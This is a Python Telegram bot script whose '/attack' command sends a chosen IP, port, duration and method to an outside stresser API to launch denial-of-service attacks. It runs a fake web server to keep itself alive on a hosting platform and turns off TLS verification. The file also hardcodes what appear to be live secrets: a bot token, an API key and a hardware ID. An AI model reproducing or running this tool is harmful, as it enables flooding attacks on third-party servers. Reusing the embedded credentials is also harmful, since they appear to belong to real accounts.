import asyncio
import requests
import os
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiohttp import web

# --- CONFIG ---
API_TOKEN = '8698418003:AAF2mTYGzF6eRhJ7iQRD2wwXeEwXF_P4wh8'
API_KEY = "f2fb37dd1800da5e267b4e045a97ed25be0ae91c912d4d7a77912ae921c5a481" 
ADMIN_ID = 1001450667
MY_HWID = "1fde54bc203b764c212172bb8157015e290cee6510c23be30b96020cc94afb5"

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# --- FAKE WEB SERVER FOR RENDER ---
async def handle(request):
    return web.Response(text="Bot is Running!")

async def start_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    # Render automatically provides a PORT, we must use it
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

@dp.message(Command("attack"))
async def cmd_attack(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 5: return await message.answer("⚠️ `/attack IP PORT TIME METHOD`")
    
    target, port, duration, method = args[1], args[2], args[3], args[4]
    sent = await message.answer("🚀 **VIP TUNNEL ACTIVATED (RENDER)...**")

    headers = {
        "X-API-Key": API_KEY,
        "X-HWID": MY_HWID,
        "User-Agent": "AN-HAX-VIP-CLIENT",
        "Content-Type": "application/json"
    }

    try:
        url = f"https://retrostress.net/api/v1/tests?key={API_KEY}"
        payload = {"host": target, "port": int(port), "time": int(duration), "method": method.upper(), "vip": True}
        
        # Verify=False to skip that TLS warning you saw
        res = requests.post(url, json=payload, headers=headers, timeout=20, verify=False)
        
        if res.status_code == 200:
            await sent.edit_text(f"✅ **VIP ATTACK LIVE!**\n🎯 Target: `{target}`\n🚀 Status: `RENDER BYPASS SUCCESS` 🔥")
        else:
            await sent.edit_text(f"❌ **DENIED:** Cloud IP Blocked. Bhai, unka server Render ko accept nahi kar raha.")
    except Exception as e:
        await sent.edit_text(f"❌ **ERROR:** {str(e)}")

async def main():
    # Start the fake web server and bot together
    asyncio.create_task(start_server())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
